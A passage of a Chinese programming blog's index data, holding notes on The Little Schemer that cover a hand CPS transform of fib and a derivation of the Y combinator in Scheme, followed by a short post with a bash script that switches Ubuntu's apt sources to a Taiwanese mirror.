看到參數列，他多了return 看到base case，直接調用return 看到inductive case，\n遞迴的部分被拉出來了 跳回來要做的事，被放到lambda中 在lambda因為完成了計算，所以調用了return 根據剛剛的觀察，我們可以找到手工轉cps的方法\n參數列加入return base case直接調用return 把遞迴的部分拉到最外面 在lambda完成原本跳回來的計算，並調用return 來試試轉fib吧\n(define (fib n) (if (\u0026lt; n 2) 1 (+ (fib (- n 1)) (fib (- n 2))))) 先加return與base case調用return\n(define (fib n return) (if (\u0026lt; n 2) (return 1) (+ (fib (- n 1)) (fib (- n 2))))) 接著要把遞迴拉出來，但是這有兩個遞迴，要怎麼辦? 如果用C語言來寫原本的fib可以寫成\nint fib(int n) { if(n \u0026lt; 2) return 1; else { int tmp1 = fin(n-1); int tmp2 = fib(n-2); return tmp1 + tmp2; } } 所以我們應該也可以像tmp1與tmp2一樣，一次處理一個，在最後再調用return\n(define (fib n return) (if (\u0026lt; n 2) (return 1) (fin (- n 1) (lambda (tmp1) (fib (- n 2) (lambda (tmp2) (return (+ tmp1 tmp2)))))))) 應該要修修前面的手工方法\n參數列加入return base case直接調用return 一次把一個遞迴的部分拉到最外面 在lambda完成原本跳回來的計算，並調用return 到這裡終於可以來說明什麼是cps了!! cps是continuation-passing-style的簡稱。 continuation中文叫延續。\n雖然上面都是用return來代稱，但是continuation能做的事不只是return而已。\ncontinuation可以想像成代辦事項或是Program conuter，也許會比較好思考一點。\n如果改變continuation的內容，可以讓原本的程式跑去做別的事，一去不復返，或是再回來同一個地方。\n可以用continuation實現像prolog的DSL、exception的catch-throw與簡單的thread等神奇的應用。\n有機會可以等The Seasoned Schemer的心得寫完，來整理continuation的應用與在邏輯上的意義。\n題外話，其實再多一點推導，可以推出continuation的monad，但是monad的推導與整理，也是之後再拉一篇文章來寫。\nTODO Y combinator的CPS版是?\nY combinator 我們從sum開始\n(define sum (lambda (l) (if (null? l) 0 (+ (car l) (sum (cdr l)))))) 假設我們沒有define來做遞迴了，但是要做出sum的效果。\n可以多加一層來引入能做出sum效果的函數\n(define sum-cant-work (lambda (sum1) (lambda (l) (if (null? l) 0 (+ (car l) (sum1 (cdr l))))))) 那原本的sum要給什麼，不然不會動 把整個lambda再丟到，sum的參數中就可以用了\n(define sum-still-cant-work ((lambda (sum1) (lambda (l) (if (null? l) 0 (+ (car l) (sum1 (cdr l)))))) ;; sum1需要sum1!! (lambda (sum1) (lambda (l) (if (null? l) 0 (+ (car l) (sum1 (cdr l)))))))) ;; sum1需要sum1!! 等等還是不能動，看到遞迴的sum，應該要先把sum1丟到sum1中\n(define sum-can-work-but-ugly ((lambda (sum1) (lambda (l) (if (null? l) 0 (+ (car l) ((sum1 sum1) (cdr l)))))) (lambda (sum1) (lambda (l) (if (null? l) 0 (+ (car l) ((sum1 sum1) (cdr l)))))))) 好醜，抽象重複的部分\n(define sum-can-work-but-wierd ((lambda (mk) (mk mk)) (lambda (sum1) (lambda (l) (if (null? l) 0 (+ (car l) ((sum1 sum1) (cdr l)))))))) ;; (sum1 sum1) 能不能改成 像 sum 這樣 現在就是(sum1 sum1)怪怪的 能不能把他抽掉嗎?\n(define sum-can-work ((lambda (mk) (mk mk)) (lambda (sum1) ((lambda (sum) ;; 從這裡到 ... (lambda (l) (if (null? l) 0 (+ (car l) (sum (cdr l)))))) ;; 這裡與原本的sum好像 (lambda (arg) ((sum1 sum1) arg))))) sum好像浮出來了 試著把他拉出去\n(define sum-mk (lambda (sum) (lambda (l) (if (null? l) 0 (+ (car l) (sum (cdr l))))))) (define sum-can-work (lambda (sum-mk) ((lambda (mk) (mk mk)) (lambda (sum1) (sum-mk (lambda (arg) ((sum1 sum1) arg))))))) 這sum-can-work好像可以產生sum以外的遞迴函數，應該換個名字\n(define Y (lambda (mk) ((lambda (f) (f f)) (lambda (g) (mk (lambda (arg) ((g g) arg))))))) 這就是Y combinator嚴格求值版。 還有惰性求值版與set!版。 set!版在The Seasoned Schemer有介紹，而惰性求值版之後會在Y combinator的專文中補完。\n略過的部分 直譯器 set \u0026amp; relation 停機問題 直譯器等到以後打EoPL與LiSP的心得再說。 set與relation的部分直接去看就好。 停機問題等摸熟計算理論再說吧。 ","permalink":"https://littlebees.github.io/2020/04/the-little-schemer%E8%AE%80%E5%BE%8C%E7%AD%86%E8%A8%98/","summary":"前言 The Little Schemer(TLS)的目的是教讀者寫遞迴。 這篇筆記不依照章節順序，用主題式的方式，把我心中的這本書呈現出來。\n行前須知 知道什麼是?\nbase 與 inductive case 在歸納法中大概的意思 快速Scheme Tutorial 調用: (\u0026lt;function-or-operator) \u0026lt;args...\u0026gt;) 宣告變數: (define \u0026lt;var-name\u0026gt; \u0026lt;value\u0026gt;) 條件式:\n(if \u0026lt;predicate\u0026gt; \u0026lt;when-true\u0026gt; \u0026lt;when-false\u0026gt;) (cond [\u0026lt;predicate\u0026gt; \u0026lt;do-somthing\u0026gt;] ... [else \u0026lt;do-somthing\u0026gt;]) 函數:\n(define \u0026lt;func-name\u0026gt; (lambda (\u0026lt;args...\u0026gt;) \u0026lt;do-somthing\u0026gt;)) ;; OR (define (\u0026lt;func-name\u0026gt; (\u0026lt;args...\u0026gt;)) \u0026lt;do-somthing\u0026gt;) 匿名函數:\n(lambda (\u0026lt;args...\u0026gt;) \u0026lt;do-somthing\u0026gt;) 本書用到的資料結構介紹 Atom \u0026lt;line-of-characters\u0026gt;還有數字\nList of OO 有哪些可能性(case) base case: 空 inductive case: 有東西 建構 空 的case : \u0026lsquo;() 有東西 的case : cons 分解 有東西 的case : car 與 cdr 對應到cons有兩個參數，所以會有兩個解構子。 區分case 空 的case : null?","title":"The Little Schemer讀後筆記"},{"content":"灌了ubuntu第一件事，不是更新，是換一個快的mirror\nscript #! /bin/bash new=free.nchc.org.tw old=$(cat /etc/apt/sources.list | grep main | awk \u0026#39;{ print $2 }\u0026#39; | cut -d\u0026#39;/\u0026#39; -f3 | sed -n \u0026#39;3P\u0026#39;) sudo sed -i \u0026#34;s/$old/$new/g\u0026#34; /etc/apt/sources.list sudo sed -i \u0026#34;s/security.ubuntu.com/$new/g\u0026#34; /etc/apt/sources.list sudo apt update bash的複習: 各種expansion 給個變數\nhi=123 Arithmetic expansion Variables expansion 單雙引號不一樣 最通用的 Command expansion Ref bash的資料 改mirror的資料\n","permalink":"https://littlebees.github.io/2020/04/ubuntu-mirror/","summary":"灌了ubuntu第一件事，不是更新，是換一個快的mirror\nscript #! /bin/bash new=free.nchc.org.tw old=$(cat /etc/apt/sources.list | grep main | awk \u0026#39;{ print $2 }\u0026#39; | cut -d\u0026#39;/\u0026#39; -f3 | sed -n \u0026#39;3P\u0026#39;) sudo sed -i \u0026#34;s/$old/$new/g\u0026#34; /etc/apt/sources.list sudo sed -i \u0026#34;s/security.ubuntu.com/$new/g\u0026#34; /etc/apt/sources.list sudo apt update bash的複習: 各種expansion 給個變數\nhi=123 Arithmetic expansion Variables expansion 單雙引號不一樣 最通用的 Command expansion Ref bash的資料 改mirror的資料","title":"ubuntu-mirror"}]